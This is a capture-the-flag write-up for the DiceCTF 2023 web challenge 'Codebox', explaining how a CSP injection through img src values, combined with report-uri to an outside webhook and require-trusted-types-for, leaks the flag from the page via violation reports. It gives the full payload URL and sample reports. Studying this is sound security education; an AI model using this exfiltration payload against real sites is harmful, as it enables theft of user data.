---
Title: Codebox - DiceCTF 2023
Date: 2023-02-08T00:00:00+05:30
Tags: [web, ctf, writeup, csp, dicectf23-writeups, report-uri, require-trusted-types-for]
Categories: [dicectf23-writeups,All Writeups]
Authors: [Rohit]
---

#### tl;dr

  - Use img src to inject csp
  - Use `report-uri your-domain` to get csp violation reports
  - Use `require-trusted-types-for 'script'` to get violation when `innerHTML` is set
  - Use `code=&code<payload>` to make code undefined in front end

Final Payload: `https://codebox.mc.ax/?code=&code=<img+src="*;+require-trusted-types-for+'script'+;+report-uri+https://your.domain.com/"+>`


<!--more-->

## Description

strellic makes csp challs, maybe i should try one sometime

- **Author** : EhhThing
- **Category** : Web
- **Points** : 220
- **Solves** : 30

## Solution

### Understanding the challenge

In this challenge, we had a web page where we could insert any HTML. But there is [csp](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) in the web page 

```js
const CSP = [
        "default-src 'none'",
        "style-src 'unsafe-inline'",
        "script-src 'unsafe-inline'",
    ];
```

We can send HTML as a GET parameter `code` in the url.
In the [backend](files/web.js) they will process the html and find the image tags

``` js
const fastify = require('fastify')();
const HTMLParser = require('node-html-parser');

const box = require('fs').readFileSync('box.html', 'utf-8');

fastify.get('/', (req, res) => {
    const code = req.query.code;
    const images = [];

    if (code) {
        const parsed = HTMLParser.parse(code);
        for (let img of parsed.getElementsByTagName('img')) {
            let src = img.getAttribute('src');
            if (src) {
                images.push(src);
            }
        }
    }
```
then for every image tag we add, they add the source of that to csp `img-src`

```
if (images.length) {
        csp.push(`img-src ${images.join(' ')}`);
    }
```

### CSP Injection

So there are no checks done in img src so we can add a `;` and add as much as csp attributes as we want. For example

`https://codebox.mc.ax/?code=<img src="*; script-src 'unsafe-inline'">`

This will add `script-src 'unsafe-inline'` to csp. So we can add any csp attribute we want.

![csp-injection](images/csp-injection.png)

But actually, the HTML is added to the webpage using [frontend](files/box.html)

```js
const code = new URL(window.location.href).searchParams.get('code');
    if (code) {
        const frame = document.createElement('iframe');
        frame.srcdoc = code;
        frame.sandbox = '';
        frame.width = '100%';
        document.getElementById('content').appendChild(frame);
        document.getElementById('code').value = code;
    }

    const flag = localStorage.getItem('flag') ?? "flag{test_flag}";
    document.getElementById('flag').innerHTML = `<h1>${flag}</h1>`;
```

### Using the csp injection

So our HTML is added to an [sandboxed](https://html.com/attributes/iframe-sandbox/) iframe. And none of the attributes is given, which means we can do practically nothing. We need the `allow-scripts` attribute in [sandbox](https://html.com/attributes/iframe-sandbox/) to execute scripts inside the iframe.

Now where we have injection is in the csp so we will take a look at csp attributes that we can set. We get a list of all attributes and compatible values from [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP#browser_compatibility)

So there are two interesting attributes

[report-uri](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri)
[require-trusted-types-for](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/require-trusted-types-for)

So what this does is that, whenever there is a violation of csp, the browser will send a report to the URL specified in report-uri. So we can use this.

We will get a report like this

```json
{
  "csp-report": {
    "document-uri": "https://codebox.mc.ax/?code=%3Cimg+src%3D%22*%3B+report-uri+https%3A%2F%2Fwebhook.site%2F73cb229b-f15a-4d83-ae54-cee42096f621%3Bframe-src+%27none%27%22%3E",
    "referrer": "https://codebox.mc.ax/?code=%3Cimg+src%3D%22*%3B+report-uri+%27https%3A%2F%2Fwebhook.site%2F73cb229b-f15a-4d83-ae54-cee42096f621%27%3Bframe-src+%27none%27%22%3E",
    "violated-directive": "font-src",
    "effective-directive": "font-src",
    "original-policy": "default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src *; report-uri https://webhook.site/73cb229b-f15a-4d83-ae54-cee42096f621;frame-src 'none'",
    "disposition": "enforce",
    "blocked-uri": "https://codebox.mc.ax/DMSans-Regular.ttf",
    "status-code": 200,
    "script-sample": ""
  }
}
```

**But how will we include the flag in it?**

That's where the other attribute comes in. `require-trusted-types-for` directive instructs user agents to control the data passed to DOM XSS sink functions, like the `Element.innerHTML` setter. Since we don't send and `trusted-types` header, whenever we try to set the innerHTML of any element the csp will block it and it will raise an error. That error will be sent to the report uri.

But when we set that csp `require-trusted-types-for 'script'`, this is  the error we get

![error](images/error.png)

We will get a report like

```json
{
  "csp-report": {
    "document-uri": "https://codebox.mc.ax/?code=%3Cimg+src%3D%22*%3B+report-uri+https%3A%2F%2Fwebhook.site%2F73cb229b-f15a-4d83-ae54-cee42096f621%3Brequire-trusted-types-for+%27script%27%22%3E",
    "referrer": "https://codebox.mc.ax/?code=%3Cimg+src%3D%22*%3B+report-uri+https%3A%2F%2Fwebhook.site%2F73cb229b-f15a-4d83-ae54-cee42096f621%3Bframe-src+%27none%27%22%3E",
    "violated-directive": "require-trusted-types-for",
    "effective-directive": "require-trusted-types-for",
    "original-policy": "default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src *; report-uri https://webhook.site/73cb229b-f15a-4d83-ae54-cee42096f621;require-trusted-types-for 'script'",
    "disposition": "enforce",
    "blocked-uri": "trusted-types-sink",
    "line-number": 50,
    "column-number": 22,
    "source-file": "https://codebox.mc.ax/",
    "status-code": 200,
    "script-sample": "HTMLIFrameElement srcdoc|<img src=\"*; report-uri https://webhook."
  }
}
```

This is because the first point where we do such an operation is in

```js
frame.srcdoc = code;
```

It will report that part of the code only. To bypass that the code needs to be `undefined`


### Fooling the browser

So we can't obviously send no `code` parameter and get the flag. But we need to take into account the interoperability of the backend and frontend. The backend is what is setting the [csp](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP), but the front end is checking the code. They are accessing the `code` in frontend using

```js
const code = new URL(window.location.href).searchParams.get('code');
```

This will take the first parameter in the url. But in node if we sent two parameters they will join both using a ',` so we will still get [csp](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) injection.

So sending a URL like this

`https://codebox.mc.ax/?code=&code=<img+src="*;+require-trusted-types-for+'script'+;+report-uri+https://your.domain.com/"+>`

will give a report

```json
{
  "csp-report": {
    "document-uri": "https://codebox.mc.ax/?code=&code=%3Cimg+src%3D%22*%3B+report-uri+https%3A%2F%2Fwebhook.site%2F73cb229b-f15a-4d83-ae54-cee42096f621%3Brequire-trusted-types-for+%27script%27%22%3E",
    "referrer": "",
    "violated-directive": "require-trusted-types-for",
    "effective-directive": "require-trusted-types-for",
    "original-policy": "default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src *; report-uri https://webhook.site/73cb229b-f15a-4d83-ae54-cee42096f621;require-trusted-types-for 'script'",
    "disposition": "enforce",
    "blocked-uri": "trusted-types-sink",
    "line-number": 58,
    "column-number": 47,
    "source-file": "https://codebox.mc.ax/",
    "status-code": 200,
    "script-sample": "Element innerHTML|<h1>flag{test_flag}</h1>"
  }
}
```

Sending this to admin will get you the correct flag


**Flag**: `dice{i_als0_wr1te_csp_bypasses}`
